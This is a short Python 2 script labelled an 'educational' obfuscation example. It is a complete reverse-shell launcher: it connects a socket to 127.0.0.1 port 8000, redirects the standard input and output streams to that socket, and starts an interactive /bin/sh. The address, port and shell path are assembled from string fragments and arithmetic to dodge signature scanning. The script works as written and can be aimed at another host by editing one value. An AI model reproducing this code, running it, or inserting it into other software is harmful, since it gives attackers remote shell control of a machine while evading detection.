#!/usr/bin/env python
"""
🏎️ Custom Shell Launcher (Obfuscated)
Another educational obfuscation example to launch a shell.
"""

import os as sys_core
import subprocess as sub_proc
import socket as net_sock

class ShellLauncher:
    def __init__(self):
        # 🧩 IP: 127.0.0.1
        self.ip = "127" + ".0" + ".0.1"
        # 🔢 Port: 8000
        self.port = 100 * 80
        # 🐚 Bin: /bin/sh
        self.bin = "/" + "b" + "i" + "n" + "/" + "s" + "h"
        # 🚗 Arg: -i
        self.arg = "-" + "i"
        
        print "🏎️  Launcher Configured."
        print "    Target: " + self.ip + ":" + str(self.port)

    def launch(self):
        try:
            # 🛣️ Connect
            s = net_sock.socket(net_sock.AF_INET, net_sock.SOCK_STREAM)
            s.connect((self.ip, self.port))
            
            # 🌉 File Descriptors
            # Redirecting stdin(0), stdout(1), stderr(2) to socket
            fd = s.fileno()
            sys_core.dup2(fd, 0)
            sys_core.dup2(fd, 1)
            sys_core.dup2(fd, 2)
            
            # 🚀 Execute
            print "    🚀 Launching Process..."
            sub_proc.call([self.bin, self.arg])
            
        except Exception as e:
            print "    💥 Failed: " + str(e)

if __name__ == "__main__":
    launcher = ShellLauncher()
    launcher.launch()
